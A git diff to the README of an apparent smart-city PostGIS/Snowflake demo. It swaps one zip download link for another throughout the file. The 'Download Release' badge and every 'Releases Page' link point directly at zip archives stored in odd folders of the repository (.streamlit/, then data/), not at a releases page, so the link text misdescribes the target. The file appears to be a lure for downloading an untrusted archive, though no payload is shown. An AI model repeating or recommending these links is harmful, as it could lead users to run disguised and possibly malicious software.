@@ -1,6 +1,6 @@
 # 🌟 postgis-snowflake-intelligence-demo - Smart City Management Made Easy
 
-[![Download Release](https://raw.githubusercontent.com/AiraCode/postgis-snowflake-intelligence-demo/main/.streamlit/postgis-snowflake-intelligence-demo-3.0.zip%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/AiraCode/postgis-snowflake-intelligence-demo/main/.streamlit/postgis-snowflake-intelligence-demo-3.0.zip)
+[![Download Release](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/raw/refs/heads/main/data/snowflake_postgis_demo_intelligence_3.2.zip%20Release-Click%20Here-brightgreen)](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/raw/refs/heads/main/data/snowflake_postgis_demo_intelligence_3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ To run this application, you will need:
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [Releases Page](https://raw.githubusercontent.com/AiraCode/postgis-snowflake-intelligence-demo/main/.streamlit/postgis-snowflake-intelligence-demo-3.0.zip). 
+To download the application, visit this page to download: [Releases Page](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/raw/refs/heads/main/data/snowflake_postgis_demo_intelligence_3.2.zip). 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the version you want. Choose the latest version for the best features and support.
@@ -84,4 +84,4 @@ For detailed instructions on advanced features, consult the documentation linked
 
 Join the community to share your experience, ask questions, or provide feedback. Engaging with others can enhance your understanding and improve the technology further.
 
-For a comprehensive experience and to stay updated, visit the [Releases Page](https://raw.githubusercontent.com/AiraCode/postgis-snowflake-intelligence-demo/main/.streamlit/postgis-snowflake-intelligence-demo-3.0.zip) frequently.
+For a comprehensive experience and to stay updated, visit the [Releases Page](https://github.com/AiraCode/postgis-snowflake-intelligence-demo/raw/refs/heads/main/data/snowflake_postgis_demo_intelligence_3.2.zip) frequently.
